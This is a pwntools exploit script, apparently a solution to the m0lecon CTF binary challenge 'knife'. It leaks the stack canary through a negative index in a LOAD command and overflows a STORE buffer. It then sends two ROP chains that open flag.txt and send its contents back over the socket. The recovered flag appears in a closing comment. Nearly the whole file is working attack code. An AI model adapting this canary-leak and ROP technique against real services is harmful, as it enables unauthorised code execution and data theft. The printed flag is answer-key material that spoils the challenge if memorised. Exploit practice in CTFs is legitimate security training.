from pwn import *

context.log_level = "debug"
context.binary = elf = ELF('./knife')
# r = process('./knife')
# gdb.attach(r, "break *0x40127F")
p = remote("challs.m0lecon.it", 9010)
bss = elf.bss(0x50)
print hex(bss)

# p = remote("localhost", 8888)

pop_rdi = 0x00000000004014f3
pop_rsi_r15 = 0x00000000004014f1

def load(idx):
    p.sendline("LOAD {}".format(idx))
    return p.recv(8)

canary = u64(load(-13))
stock = "STORE 1 ".ljust(0x30-8, "A")

fd = 4

ropchain = flat([
    pop_rdi, 4,
    pop_rsi_r15, bss, 0,
    elf.symbols['recvlen'],
    pop_rdi, bss,
    pop_rsi_r15, 0, 0,
    elf.plt['open'],
    pop_rdi, 4,
    elf.symbols['fork_handler']
])


ropchain2 = flat([
    pop_rdi, 3,
    pop_rsi_r15, bss, 0,
    elf.plt['read'],
    pop_rdi, 3,
    pop_rsi_r15, bss+0x17, 0,
    elf.plt['read'],
    pop_rdi, 4,
    pop_rsi_r15, bss, 0,
    elf.symbols['sendlen'],
    pop_rdi, 4,
    pop_rsi_r15, bss+0x17, 0,
    elf.symbols['sendlen']
])

payload = stock + p64(canary) + p64(0) + ropchain
p.sendline(payload)
p.recvuntil("Saved!\n")
p.sendline("EXIT")


filename = "flag.txt"

p.sendafter("\x00", filename.ljust(0x17, "\x00"))

payload2 = stock + p64(canary) + p64(0) + ropchain2

p.sendline(payload2)
p.recvuntil("Saved!\n")
p.sendline("EXIT")

p.interactive()
# ptm{f0rk5_ar3n7_g00d_f0r_cnr13s}
# r.close()